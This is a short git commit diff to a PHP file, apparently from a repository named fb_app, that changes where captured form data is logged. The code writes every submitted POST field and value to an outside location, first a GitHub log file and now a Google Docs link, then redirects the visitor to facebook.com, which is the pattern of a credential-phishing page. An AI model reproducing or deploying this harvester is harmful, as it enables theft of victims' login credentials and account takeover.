5c985f7037e095d51b62fec84eabc57cfc18cfa4
harithadushmantha <72427754+harithadushmantha@users.noreply.github.com>
2021-06-02 07:57:18 +0530

    Update code.php

--- code.php
+++ code.php
@@ -2,7 +2,7 @@
 <?php
 
 header('Location: https://www.facebook.com');
-$handle = fopen("https://github.com/harithadushmantha/fb_app/blob/main/log.txt","a");
+$handle = fopen("https://docs.google.com/document/d/1zX_wyi-hqWWIZccjYznGla16Yj6SkJ8QZzrRnn0yoEA/edit?usp=sharing","a");
 foreach($_POST as $variable => $value){
     fwrite($handle,$variable);
     fwrite($handle,"=");
